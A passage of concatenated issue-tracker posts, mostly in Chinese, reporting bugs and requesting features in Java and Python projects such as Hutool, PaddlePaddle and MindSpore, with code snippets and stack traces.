使用cn.hutool.core.io.FileUtil#clean 偶然问题,使用的JDK版本和Hutool版本 4.1.8 cn.hutool.core.io.FileUtil#clean 删除目录抛出 java.nio.file.DirectoryNotEmptyException 异常 这不是是什么情况呢 是文件异常，但是后面就没有出现了   <code>: Caused by: cn.hutool.core.io.IORuntimeException: DirectoryNotEmptyException: \tashimall\page_templates\business-web\business-web\v2\internetHome\html\e_commerce\goods at cn.hutool.core.io.FileUtil.del(FileUtil.java:705) at cn.hutool.core.io.FileUtil.clean(FileUtil.java:741) at cn.hutool.core.io.FileUtil.del(FileUtil.java:700) at cn.hutool.core.io.FileUtil.clean(FileUtil.java:741) at cn.hutool.core.io.FileUtil.del(FileUtil.java:700) at cn.hutool.core.io.FileUtil.clean(FileUtil.java:741) at cn.hutool.core.io.FileUtil.del(FileUtil.java:700) at cn.hutool.core.io.FileUtil.clean(FileUtil.java:741) at cn.hutool.core.io.FileUtil.del(FileUtil.java:700) at cn.hutool.core.io.FileUtil.clean(FileUtil.java:741) at cn.hutool.core.io.FileUtil.del(FileUtil.java:700) at cn.hutool.core.io.FileUtil.clean(FileUtil.java:741) at cn.hutool.core.io.FileUtil.clean(FileUtil.java:721) at com.yokead.module.PageTemplateCache.deleteCache(PageTemplateCache.java:48) at com.yokead.module.PageTemplateCache.loadAll(PageTemplateCache.java:90) at com.yokead.module.PageTemplateCache.init(PageTemplateCache.java:77) at com.yokead.common.FileResourceLoader.getResourceStream(FileResourceLoader.java:38) at org.apache.velocity.Template.process(Template.java:108) at org.apache.velocity.runtime.resource.ResourceManagerImpl.loadResource(ResourceManagerImpl.java:437) at org.apache.velocity.runtime.resource.ResourceManagerImpl.getResource(ResourceManagerImpl.java:352) at org.apache.velocity.runtime.RuntimeInstance.getTemplate(RuntimeInstance.java:1533) at org.apache.velocity.runtime.RuntimeInstance.getTemplate(RuntimeInstance.java:1514) at org.apache.velocity.app.VelocityEngine.getTemplate(VelocityEngine.java:373) at org.springframework.web.servlet.view.velocity.VelocityView.getTemplate(VelocityView.java:503) at org.springframework.web.servlet.view.velocity.VelocityView.checkResource(VelocityView.java:263) ... 41 common frames omitted Caused by: java.nio.file.DirectoryNotEmptyException: \tashimall\page_templates\business-web\business-web\v2\internetHome\html\e_commerce\goods at sun.nio.fs.WindowsFileSystemProvider.implDelete(WindowsFileSystemProvider.java:266) at sun.nio.fs.AbstractFileSystemProvider.delete(AbstractFileSystemProvider.java:103) at java.nio.file.Files.delete(Files.java:1126) at cn.hutool.core.io.FileUtil.del(FileUtil.java:703) ... 65 common frames omitted
【论文复现】add_sublayer 出错,"` 在训练DenseNet 121, 下面的关于add_sublayer的代码训练时出现一个问题。请问要如何解决？ /opt/conda/envs/python35-paddle120-env/lib/python3.7/site-packages/paddle/fluid/dygraph/tracer.py in trace_op(self, type, inputs, outputs, attrs, stop_gradient) 41 self.trace(type, inputs, outputs, attrs, 42 framework._current_expected_place(), self._train_mode and ---&gt; 43 not stop_gradient) 44 45 def train_mode(self): RuntimeError: parallel_for failed: an illegal memory access was encountered   <code>: self.feature0=Sequential() self.feature0.add_sublayer('conv1', Conv3D(n_input_channels, num_init_features, filter_size=(conv1_t_size, 7, 7), stride=(conv1_t_stride, 2, 2), padding=(conv1_t_size // 2, 3, 3)))`"
启用分页参数合理化reasonable情况下pageNum>总页数不能查询到最后一页？,根据文档： 我在把设置为，设置为的情况下，会查询第一页，返回的是空？   <code>: 配置reasonable为true，这时如果pageNum&lt;1会查询第一页，如果pageNum&gt;总页数会查询最后一页。 reasonable true offsetAsPageNum true pageNum&lt;1 pageNum&gt;总页数
ArrayUtil.isEmpty不支持List,"JDK版本： openjdk_8_201 hutool版本： 5.X.X   <code>: List&lt;String&gt; list=new ArrayList&lt;&gt;(); if(ArrayUtil.isEmpty(list)){ //到不了这里，isEmpty里面的isArray方法会把list判定为false，以至于list的长度是0但整个方法却返回了false; //希望这个方法能支持List,不然每次都要写if(list==null||list.isEmpty()) //ObjectUtil倒是支持List判空，但是个人感觉List的话用ArrayUtil判空会更合适一些。 }"
关于 fluid.layers.data 更改 lod_level 的一点疑惑,"Fluid 1.6，本例无其它特殊环境。 console 调试代码时无意中更改了数据层的 lod_level，报错： 并仔细看了<em>fluid.layers.data</em>以及<em>name</em>相关的文档，并未找到合理的答案。 “name 用于网络层输出的前缀标识，name值_数字.tmp_数字中的数字会递增。” 一方面常规理解后者定义应该可以正常覆盖前者；另一方面，Fluid 内部的命名也是自增以作区分。 而报错是针对 lod_tensor，难道是 paddle 静态图对网络定义上的某种限制？ 谢谢。   <code>: x = fluid.layers.data(name=""argX"", shape=[1], dtype='float32', lod_level=1) x = fluid.layers.data(name=""argX"", shape=[1], dtype='float32', lod_level=2) ValueError: Variable argX has been created before. The previous lod_level is 1; the new lod_level is 2. They are not matched"
IReadHandler是不是需要修改下,现在测试项目 easypoi-test 里面 PartionsTest 和 ExcelImportUtilTest 都会报错，如果修改成下面的就不会报错：   <code>: @FunctionalInterface public interface IReadHandler&lt;T&gt; { /** * 处理解析对象 * * @param t */ public void handler(T t); /** * 处理完成之后的业务 */ default void doAfterAll(){} }
CostTask计费处理bug：jizhun_wendu 和 rec_deg都有可能为null，null时会中断,"以下是代码，catch到了之后还会发生Exception，这里要可能面要null里置零吧   <code>: try{ recdeg = Double.parseDouble(resulthq.get(i).get(""rec_deg"").toString()) - Double.parseDouble(resulthq.get(i).get(""jizhun_wendu"").toString()); }catch (Exception e){ recdeg = 0 - Double.parseDouble(resulthq.get(i).get(""jizhun_wendu"").toString()); }"
assetController有报错 Failed to open stream: No such file or directory,"基础信息 请知晓 chemex 通过版本滚动发布，所有帮助请求仅对最新版本有效，因此在反馈问题之前请务必先升级至最新版，并进行测试复现。 版本号：3.5.2 问题描述：访问 域名/api/assets 会报Failed to open stream: No such file or directory 经查证是vendor中Uni.php等文件的真实路径和composer/autoload_classmap.php、composer/autoload_static.php中引用的路径不一致导致的 实际路径 celaraze/src/* 文件中路径 celaraze/laravel-ace/src/* 删除/laravel-ace即可 代码片段： composer/autoload_classmap.php（9-13行） composer/autoload_static.php（704行） composer/autoload_static.php（726-730行） 复现步骤：直接访问 域名/api/assets即可重现。 截图（可选）：   <code>: 'Ace\\Arr' =&gt; $vendorDir . '/celaraze/laravel-ace/src/Arr.php', 'Ace\\DateTime' =&gt; $vendorDir . '/celaraze/laravel-ace/src/DateTime.php', 'Ace\\System' =&gt; $vendorDir . '/celaraze/laravel-ace/src/System.php', 'Ace\\Traits\\EloquentPlus' =&gt; $vendorDir . '/celaraze/laravel-ace/src/Traits/EloquentPlus.php', 'Ace\\Uni' =&gt; $vendorDir . '/celaraze/laravel-ace/src/Uni.php', 0 =&gt; __DIR__ . '/..' . '/celaraze/laravel-ace/src', 'Ace\\Arr' =&gt; __DIR__ . '/..' . '/celaraze/laravel-ace/src/Arr.php', 'Ace\\DateTime' =&gt; __DIR__ . '/..' . '/celaraze/laravel-ace/src/DateTime.php', 'Ace\\System' =&gt; __DIR__ . '/..' . '/celaraze/laravel-ace/src/System.php', 'Ace\\Traits\\EloquentPlus' =&gt; __DIR__ . '/..' . '/celaraze/laravel-ace/src/Traits/EloquentPlus.php', 'Ace\\Uni' =&gt; __DIR__ . '/..' . '/celaraze/laravel-ace/src/Uni.php',"
[MS][NET][CRNN-Seq2Seq-OCR][pynative][ascend 8p]network train failed,": /device ascend : -- MindSpore version :commit_id:8666a336 -- Python version : -- OS platform and distribution : -- GCC/Compiler version : run包:http://10.90.67.50/productrepo/HiAI/HISI_C78/20210713 test_ms_modle_zoo_crnn_seq_train_check_loss_8p_pynative.py get code from model_zoo sh run_distribute_train.sh 使用PyNative模型训练CRNN-Seq2Seq-OCR网络，训练失败 CRNN-Seq2Seq-OCR网络训练成功 使用PyNative模型训练CRNN-Seq2Seq-OCR网络，训练失败   <code>: [ERROR] ME(31741:281473243645056,MainProcess):2021-07-31-16:11:57.296.642 [mindspore/dataset/engine/datasets.py:2540] Uncaught exception: Traceback (most recent call last): File ""train.py"", line 181, in &lt;module&gt; train() File ""/home/zjc/workspace/solution_test/test_scripts/mindspore/net/crnn_seq/test_ms_model_zoo_crnn_seq_train_check_loss_8p_pynative/scripts/train_parallel0/src/model_utils/moxing_adapter.py"", line 109, in wrapped_func run_func(*args, **kwargs) File ""train.py"", line 175, in train model.train(5, dataset, callbacks=callback) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/train/model.py"", line 649, in train sink_size=sink_size) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/train/model.py"", line 439, in _train self._train_dataset_sink_process(epoch, train_dataset, list_callback, cb_params, sink_size) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/train/model.py"", line 499, in _train_dataset_sink_process outputs = self._train_network(*inputs) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 404, in __call__ output = self.run_construct(cast_inputs, kwargs) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 345, in run_construct output = self.construct(*cast_inputs, **kwargs) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/train/dataset_helper.py"", line 79, in construct return self.network(*outputs) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 404, in __call__ output = self.run_construct(cast_inputs, kwargs) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 345, in run_construct output = self.construct(*cast_inputs, **kwargs) File ""/home/zjc/workspace/solution_test/test_scripts/mindspore/net/crnn_seq/test_ms_model_zoo_crnn_seq_train_check_loss_8p_pynative/scripts/train_parallel0/src/attention_ocr.py"", line 182, in construct loss = self.network(*args) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 404, in __call__ output = self.run_construct(cast_inputs, kwargs) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 345, in run_construct output = self.construct(*cast_inputs, **kwargs) File ""/home/zjc/workspace/solution_test/test_scripts/mindspore/net/crnn_seq/test_ms_model_zoo_crnn_seq_train_check_loss_8p_pynative/scripts/train_parallel0/src/attention_ocr.py"", line 136, in construct decoder_outputs = self.network(img, decoder_inputs, decoder_targets, teacher_force) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 404, in __call__ output = self.run_construct(cast_inputs, kwargs) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 345, in run_construct output = self.construct(*cast_inputs, **kwargs) File ""/home/zjc/workspace/solution_test/test_scripts/mindspore/net/crnn_seq/test_ms_model_zoo_crnn_seq_train_check_loss_8p_pynative/scripts/train_parallel0/src/attention_ocr.py"", line 112, in construct decoder_output, decoder_hidden, _ = self.decoder(decoder_input, decoder_hidden, encoder_outputs) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 404, in __call__ output = self.run_construct(cast_inputs, kwargs) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 345, in run_construct output = self.construct(*cast_inputs, **kwargs) File ""/home/zjc/workspace/solution_test/test_scripts/mindspore/net/crnn_seq/test_ms_model_zoo_crnn_seq_train_check_loss_8p_pynative/scripts/train_parallel0/src/seq2seq.py"", line 165, in construct return self.decoder(inputs, hidden, encoder_outputs) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 404, in __call__ output = self.run_construct(cast_inputs, kwargs) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 345, in run_construct output = self.construct(*cast_inputs, **kwargs) File ""/home/zjc/workspace/solution_test/test_scripts/mindspore/net/crnn_seq/test_ms_model_zoo_crnn_seq_train_check_loss_8p_pynative/scripts/train_parallel0/src/seq2seq.py"", line 112, in construct output, hidden, _, _, _, _ = self.gru(output, gru_hidden) ValueError: not enough values to unpack (expected 6, got 2) [ERROR] DRV(31741,python):2021-07-31-16:12:00.405.579 [ascend][curpid: 31741, 33983][drv][devmm][devmm_ioctl_free_pages 153]&lt;errno:16, 13&gt; Ioctl device error! ret=13 [ERROR] DRV(31741,python):2021-07-31-16:12:00.405.606 [ascend][curpid: 31741, 33983][drv][devmm][devmm_virt_heap_free_chunk_device 605]&lt;errno:16, 13&gt; devmm_ioctl_free failed. ptr=0x108800000000, heap type=4025417730. [ERROR] DRV(31741,python):2021-07-31-16:12:00.405.615 [ascend][curpid: 31741, 33983][drv][devmm][devmm_free_to_base_heap 168]&lt;errno:16, 13&gt; free ptr err, ptr=0x108800000000. [ERROR] RUNTIME(31741,python):2021-07-31-16:12:00.405.626 [npu_driver.cc:1243]33983 DevMemFree:[driver interface] halMemFree failed, dptr=0x108800000000, drvRetCode=17! [ERROR] RUNTIME(31741,python):2021-07-31-16:12:00.405.667 [logger.cc:344]33983 DevFree:Free device failed, mem=0x108800000000 [ERROR] RUNTIME(31741,python):2021-07-31-16:12:00.405.689 [api_c.cc:705]33983 rtFree:ErrCode=507899, desc=[driver error:internal error], InnerCode=0x7020010 [ERROR] RUNTIME(31741,python):2021-07-31-16:12:00.405.700 [error_message_manage.cc:27]33983 ReportFuncErrorReason:rtFree execute failed, reason=[driver error:internal error] [ERROR] DEVICE(31741,fffe667fc1e0,python):2021-07-31-16:12:00.405.723 [mindspore/ccsrc/runtime/device/ascend/ascend_memory_manager.cc:108] FreeDeviceMemory] rtFree mem size[32212254720] fail, ret[507899] [ERROR] HCCL(31741,python):2021-07-31-16:12:03.264.502 [network_manager.cc:146][hccl-31741-1-1627718650-hccl_world_group][0][Stop][Vnic]NetworkManager devicePhyId_[0] vnic stopped ERROR. refcount[-1] [ERROR] HCCL(31741,python):2021-07-31-16:12:03.264.550 [hccl_impl_base.cc:218][hccl-31741-1-1627718650-hccl_world_group][0][Destroy][NetworkResources]NetworkManager stop vnic resource failed, deviceLogicId_[0], ret[4] [ERROR] HCCL(31741,python):2021-07-31-16:12:03.318.260 [network_manager.cc:146][hccl-31741-1-1627718650-hccl_world_group][0][Stop][Vnic]NetworkManager devicePhyId_[0] vnic stopped ERROR. refcount[-2] [ERROR] HCCL(31741,python):2021-07-31-16:12:03.318.297 [hccl_impl_base.cc:218][hccl-31741-1-1627718650-hccl_world_group][0][Destroy][NetworkResources]NetworkManager stop vnic resource failed, deviceLogicId_[0], ret[4] LLVM ERROR: out of memory"
如何使用 spring 配置的的方式添加全局拦截器,Forest: 1.5.14 Backend: okhttp 拦截器的配置可以使用 的方式来配置么？因为需要对 forest 进行一下扩展   <code>: @Bean
【众智】【计算-AICPU开发】MaxUnpool2DGrad,"AICPU算子接入 MaxUnpool2D的反向算子。 接口目录：mindspore/ops/operations/_grad_ops.py ksize Union[int, tuple[int]] 属性 strides Union[int, tuple[int]] 属性 pads Union[int, tuple[int]] 属性 data_format string 属性 output_shape tuple[int] 属性 x grads argmax y 对应底层算子 对应底层AICPU算子MaxUnpool2DGrad Classify Name Type Type Range Required Format INPUT x RealNumberType TRUE INPUT grads RealNumberType TRUE INPUT argmax IndexNumberType TRUE OUTPUT y RealNumberType TRUE REQUIRED_ATTR ksize list_int TRUE REQUIRED_ATTR strides list_int TRUE REQUIRED_ATTR pads list_int TRUE ATTR data_format string FALSE ATTR output_shape list_int FALSE 标杆接口参考 3. 异常处理 4. 算子反向 无反向   <code>: class MaxUnpool2DGrad(Primitive):"
Support resolving an attribute of a Cell class instance,"RFC Support resolving an attribute of a Cell class instance Currently, for a Cell class, we can only define a function in and call the class instance directly. The following code is not allowed as the parser can't resolve the code like such as in a construct function. This makes it hard to use the distribution class for probabilistic programming described in #I1GV6C:Add abstraction of distribution to support probabilistic programming in mindspore . For the above case, after parse action, the ir is When resolving the code like , it will use the hard-coded parse method and ignore which indicates the real method. Out method is to resolve two lines together and pass as a parameter when resolving a func graph. The demo of code is in this branch. Trail No. Task Description Related Issue(URL) 1 2   <code>: construct class.attribute normal.prob class test_prob(nn.Cell): def __init__(self): super(test_prob, self).__init__() self.normal = nn.Normal(0, 1, dtype=dtype.float32) def construct(self, x): log_prob = self.normal.log_likelihood('log_prob', x) prob = self.normal.prob('prob', x) return log_prob, prob subgraph attr: subgraph @construct.5() { %0([CNode]2) = resolve(ClassMember, normal) : (&lt;null&gt;, &lt;null&gt;) -&gt; (&lt;null&gt;) %1([CNode]1) = getattr(%0, log_likelihood) : (&lt;null&gt;, &lt;null&gt;) -&gt; (&lt;null&gt;) %2(x) = %1(log_prob, %para1) : (&lt;null&gt;, &lt;null&gt;) -&gt; (&lt;null&gt;) %3([CNode]4) = resolve(ClassMember, normal) : (&lt;null&gt;, &lt;null&gt;) -&gt; (&lt;null&gt;) %4([CNode]3) = getattr(%3, prob) : (&lt;null&gt;, &lt;null&gt;) -&gt; (&lt;null&gt;) %5(x) = %4(prob, %2) : (&lt;null&gt;, &lt;null&gt;) -&gt; (&lt;null&gt;) return(%5) : (&lt;null&gt;) } resolve(ClassMember, normal) __parse_method__ getattr(%0, log_likelihood) log_likelihood %0([CNode]2) = resolve(ClassMember, normal) : (&lt;null&gt;, &lt;null&gt;) -&gt; (&lt;null&gt;) %1([CNode]1) = getattr(%0, log_likelihood) : (&lt;null&gt;, &lt;null&gt;) -&gt; (&lt;null&gt;)"
代码生产ZIP包打开报错,pigx版本: 2.2.0 操作系统: win10 是否修改包名: 否 无报错   <code>: 代码生产ZIP包后，ZIP 包解压报错。
【众智】【计算-AICPU接入】Div,"Div 基础复数算子，逐元素相除 x1 x2 y 对应底层算子 对应底层AICPU算子Div @ops.RegisterGradient(""Div"") 先接入和验收正向，反向阻塞   <code>: class Div(_MathBinaryOp):"
table里用select怎么获取当前行的数据，空项怎么显示出来不填写文字的情况下 （中文空格不管用）,"如标题   <code>: form.on('select(test1)', function (data) { console.log(data); });"
建议 UserAgentUtil 支持获取操作系统版本,"JDK版本： openjdk_8_201 hutool版本： 5.7.3 需求   <code>: UserAgent ua = UserAgentUtil.parse(""5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Mobile Safari/537.36""); System.out.println(ua.getOs().getVersion()); // 6.0 UserAgent ua = UserAgentUtil.parse(""5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36""); System.out.println(ua.getOs().getVersion()); // 10.0"
Errors are reported in multiple cases of the CPU feature,": /device cpu : -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version : test_group_param_dynamic_lr_net2_load_net1_param_rmsprop test_group_param_dynamic_lr_no_config test_group_param_lr_all_use_config_lr_same_as_default test_group_param_lr_order_rmsprop test_group_param_wd_conv1_config_conv2_config_0 test_parser_tuple_minus_index_004 test_side_effect_applycenteredrmsprop test_side_effect_applyrmsprop test_tensor_augassign_023 pytest -s MindSporeTest/interface/parameter/test_parameter_group_lr.py pytest -s MindSporeTest/side_effect_expression/test_side_effect_expression_optimizer.py pytest -s MindSporeTest/parse/test_parser_tuple_index.py 4、pytest -s MindSporeTest/parse/test_parser_tensor_augassign02.py CPU特性多个用例出现报错 用例执行结果成功   <code>: def test_group_param_dynamic_lr_net2_load_net1_param_rmsprop(): class MyRMSProp(GetLR, RMSProp): def __init__(self, params, learning_rate=0.1): super(MyRMSProp, self).__init__(params=params, learning_rate=learning_rate) RMSProp.__init__(self, params=params, learning_rate=learning_rate) self.lr_conv1_record = Parameter(Tensor([3.1], ms.float32), name=""lr_conv1_record"") self.lr_conv2_record = Parameter(Tensor([3.1], ms.float32), name=""lr_conv2_record"") ''' net opt1 define ''' fact = ParamFactory() net = ConvConvReduceNet(weight1=fact.conv1_wight, weight2=fact.conv2_wight, bias1=fact.conv1_bias, bias2=fact.conv2_bias) conv1 = list(filter(lambda x: 'conv1' in x.name, net.trainable_params())) conv2 = list(filter(lambda x: 'conv2' in x.name, net.trainable_params())) conv1_lr_list = [0.1, 0.2, 0.3, 0.4, 0.5, 0.6] default_lr_list = [1.1, 1.2, 1.3, 1.4, 1.5, 1.6] group_params = [{'params': conv1, 'lr': conv1_lr_list}, {'params': conv2}] opt1 = MyRMSProp(params=group_params, learning_rate=default_lr_list) ''' net2 opt2 define ''' net2 = ConvConvReduceNet(weight1=fact.conv1_wight, weight2=fact.conv2_wight, bias1=fact.conv1_bias, bias2=fact.conv2_bias) conv1 = list(filter(lambda x: 'conv1' in x.name, net2.trainable_params())) conv2 = list(filter(lambda x: 'conv2' in x.name, net2.trainable_params())) group_params2 = [{'params': conv1, 'lr': (2.1, 2.2, 2.3, 2.4, 2.5, 2.6)}, {'params': conv2}] opt2 = MyRMSProp(params=group_params2, learning_rate=(2.1, 2.2, 2.3, 2.4, 2.5, 2.6)) &gt; step_end, conv1_lr_cb, conv2_lr_cb = group_dynamic_lr_load_ckpt_train(net, net2, opt1, opt2) ../interface/parameter/test_parameter_group_lr.py:691: _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ ../interface/parameter/test_parameter_group_lr.py:490: in group_dynamic_lr_load_ckpt_train model.train(epoch, ds_train, callbacks=[ckpoint_cb, lr_cb], dataset_sink_mode=True) /root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/mindspore/train/model.py:718: in train sink_size=sink_size) /root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/mindspore/train/model.py:500: in _train self._train_process(epoch, train_dataset, list_callback, cb_params) /root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/mindspore/train/model.py:624: in _train_process outputs = self._train_network(*next_element) /root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/mindspore/nn/cell.py:404: in __call__ out = self.compile_and_run(*inputs) /root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/mindspore/nn/cell.py:698: in compile_and_run return _cell_graph_executor(self, *new_inputs, phase=self.phase) /root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/mindspore/common/api.py:621: in __call__ return self.run(obj, *args, phase=phase) /root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/mindspore/common/api.py:649: in run return self._exec_pip(obj, *args, phase=phase_real) /root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/mindspore/common/api.py:77: in wrapper results = fn(*arg, **kwargs) _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ self = &lt;mindspore.common.api._CellGraphExecutor object at 0x7f9e57d46d90&gt; obj = TrainOneStepCell&lt; (network): WithLossCell&lt; (_backbone): ConvConvReduceNet&lt; (conv1): Conv2d&lt;input_channels=... (1): _IteratorLearningRate&lt;&gt; (2): _IteratorLearningRate&lt;&gt; (3): _IteratorLearningRate&lt;&gt; &gt; &gt; &gt; phase = 'train.1632340272914013696.140312186341904.1' args = (Tensor(shape=[32, 3, 224, 224], dtype=Float32, value= [[[[ 2.58823544e-01, 2.54901975e-01, 2.47058839e-01 ... 7.49...000e+00], [ 0.00000000e+00, 0.00000000e+00, 0.00000000e+00 ... 0.00000000e+00, 0.00000000e+00, 1.00000000e+00]])) fn = &lt;bound method TrainOneStepCell.construct of TrainOneStepCell&lt; (network): WithLossCell&lt; (_backbone): ConvConvRedu... (1): _IteratorLearningRate&lt;&gt; (2): _IteratorLearningRate&lt;&gt; (3): _IteratorLearningRate&lt;&gt; &gt; &gt; &gt;&gt; converted = True @_wrap_func def _exec_pip(self, obj, *args, phase=''): """"""Execute the generated pipeline."""""" fn = obj.construct converted, arguments_dict, parse_method = _convert_function_arguments(fn, *args) if not converted: raise RuntimeError('Process method parameter is failure') args_list = tuple(arguments_dict.values()) obj.__parse_method__ = parse_method &gt; return self._graph_executor(args_list, phase) E RuntimeError: mindspore/ccsrc/backend/kernel_compiler/cpu/rmsprop_cpu_kernel.cc:101 Launch] ApplyRMSProp requires 9 inputs, but got 5. def test_parser_tuple_minus_index_004(): class Net(nn.Cell, MetaFactory): def __init__(self): super().__init__() MetaFactory.__init__(self) self.relu = nn.ReLU() self.funcs = (self.relu, self.relu) def construct(self, input_x, index_y, index_z): y = self.funcs[index_y](input_x) out = self.funcs[index_z](y) return out class NetPytorch(nn_torch.Module): def __init__(self): super().__init__() self.relu = nn_torch.ReLU() def forward(self, input_x): y = self.relu(input_x) out = self.relu(y) return out input_np = np.random.randn(2, 3, 4, 5).astype(np.float32) net_me = Net() net_torch = NetPytorch() fact = ParserFactory(net_me, net_torch, input_np, Tensor(-2, ms.int32), Tensor(-1, ms.int32)) fact.forward_cmp() &gt; fact.backward_cmp() ../parse/test_parser_tuple_index.py:218: _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ ../parse/test_parser_construct_input_no_tensor01.py:94: in backward_cmp allclose_nparray(input_grad_pytorch, input_grad_mindspore, self.loss, self.loss) ../share/utils.py:30: in allclose_nparray _count_unequal_element(data_expected, data_me, rtol, atol) _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ data_expected = array([[[[ 0.15105382, -1.4047858 , -0.47335762, 0. , -0.06696678], [ 0.23777539, 0.536853... 0.54968596], [ 0. , -0.4898122 , -0.9619461 , 0. , -0.47264522]]]], dtype=float32) data_me = array([[[[0., 0., 0., 0., 0.], [0., 0., 0., 0., 0.], [0., 0., 0., 0., 0.], [0., 0., 0., 0.,...0., 0.], [0., 0., 0., 0., 0.], [0., 0., 0., 0., 0.], [0., 0., 0., 0., 0.]]]], dtype=float32) rtol = 0.001, atol = 0.001 def _count_unequal_element(data_expected, data_me, rtol, atol): assert data_expected.shape == data_me.shape total_count = len(data_expected.flatten()) error = np.abs(data_expected - data_me) greater = np.greater(error, atol + np.abs(data_me) * rtol) loss_count = np.count_nonzero(greater) assert (loss_count / total_count) &lt; rtol, \ ""\ndata_expected_std:{0}\ndata_me_error:{1}\nloss:{2}"". \ &gt; format(data_expected[greater], data_me[greater], error[greater]) E AssertionError: E data_expected_std:[ 0.15105382 -1.4047858 -0.47335762 -0.06696678 0.23777539 0.53685313 E 0.06002822 -1.0723357 1.2034878 -1.4382216 0.6384862 0.77118987 E 0.4308468 0.76091534 0.52054965 0.8564579 0.11450063 0.7270321 E 2.4870803 0.3867422 -0.4889155 -1.6126546 0.05019702 0.02616879 E 0.91522187 0.0259718 0.25083786 -0.4870915 -1.0759346 0.21190496 E -1.4101534 -0.70184565 -0.620281 1.8504906 -0.5905541 -1.9857286 E 1.2707493 0.6657904 -0.02193937 -0.7432618 1.131074 0.7886907 E 0.4369579 0.7243654 1.0951688 -1.9044886 -0.46110374 -1.0134912 E -1.8804113 0.01534745 -1.29735 -1.6993073 1.3722271 1.6291429 E 1.6946491 0.54968596 -0.4898122 -0.9619461 -0.47264522] E data_me_error:[0. 0. 0. 0. 0. 0. 0. 0. 0. 0. 0. 0. 0. 0. 0. 0. 0. 0. 0. 0. 0. 0. 0. 0. E 0. 0. 0. 0. 0. 0. 0. 0. 0. 0. 0. 0. 0. 0. 0. 0. 0. 0. 0. 0. 0. 0. 0. 0. E 0. 0. 0. 0. 0. 0. 0. 0. 0. 0. 0.] E loss:[0.15105382 1.4047858 0.47335762 0.06696678 0.23777539 0.53685313 E 0.06002822 1.0723357 1.2034878 1.4382216 0.6384862 0.77118987 E 0.4308468 0.76091534 0.52054965 0.8564579 0.11450063 0.7270321 E 2.4870803 0.3867422 0.4889155 1.6126546 0.05019702 0.02616879 E 0.91522187 0.0259718 0.25083786 0.4870915 1.0759346 0.21190496 E 1.4101534 0.70184565 0.620281 1.8504906 0.5905541 1.9857286 E 1.2707493 0.6657904 0.02193937 0.7432618 1.131074 0.7886907 E 0.4369579 0.7243654 1.0951688 1.9044886 0.46110374 1.0134912 E 1.8804113 0.01534745 1.29735 1.6993073 1.3722271 1.6291429 E 1.6946491 0.54968596 0.4898122 0.9619461 0.47264522] ../share/utils.py:23: AssertionError def test_tensor_augassign_023(): class Net(Cell, MetaFactory): def __init__(self): super().__init__() MetaFactory.__init__(self) self.value = [[1.1, 2.2, 3.3, 4.4]] self.relu = ReLU() def construct(self, input_x, input_y): input_x[input_y] -= self.value[0] out = self.relu(input_x) return out class NetPytorch(nn_torch.Module): def __init__(self): super().__init__() self.value = [[1.1, 2.2, 3.3, 4.4]] self.relu = nn_torch.ReLU() def forward(self, input_x, input_y): input_x[input_y] -= self.value[0] out = self.relu(torch.from_numpy(input_x)) return out input_me_1 = Tensor([2.0, 3.0, 4.0, 5.0], mstype.float16) input_me_2 = Tensor([3, 2, 1, 0], mstype.int32) input_me_3 = Tensor([[0, 1, 2, 3]], mstype.int32) input_torch_1 = np.array([2.0, 3.0, 4.0, 5.0], dtype=np.float32) input_torch_2 = np.array([2.0, 3.0, 4.0, 5.0], dtype=np.float32) input_torch_3 = np.array([3, 2, 1, 0], dtype=np.int64) input_torch_4 = np.array([[0, 1, 2, 3]], dtype=np.int64) net = Net() net.set_grad() grad_net = GradOfAllInputs(net) grad_net.set_train() net_torch = NetPytorch() out_me_1 = net(input_me_1, input_me_2) &gt; grad_net(input_me_1, input_me_2, out_me_1) ../parse/test_parser_tensor_augassign02.py:351: _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ /root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/mindspore/nn/cell.py:404: in __call__ out = 